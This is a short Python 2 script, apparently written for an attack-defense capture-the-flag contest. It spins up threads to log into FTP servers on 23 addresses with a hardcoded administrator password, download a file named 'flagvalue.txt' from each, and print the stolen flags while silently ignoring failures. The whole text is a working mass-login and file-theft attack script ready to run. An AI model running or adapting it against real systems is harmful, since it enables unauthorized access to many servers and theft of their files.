import ftplib
import threading
def ftp(ip):
    try:
        ftp=ftplib.FTP(ip)
        ftp.login("administrator","qszrdc1q2a3zm")
        ftp.cwd('/')
        ftp.retrbinary("RETR flagvalue.txt",open('flagvalue.txt','w').write)
        with open('flagvalue.txt')as f:
            for flag in f.readlines():
                print ip+' '+flag
        ftp.quit()
    except Exception,e:
        pass
def main():
    for i in range(100,123):
        ip = '172.16.'+str(i)+'.247'
        t=threading.Thread(target=ftp,args=(ip,))
        t.start()
if __name__ == "__main__":
    main()
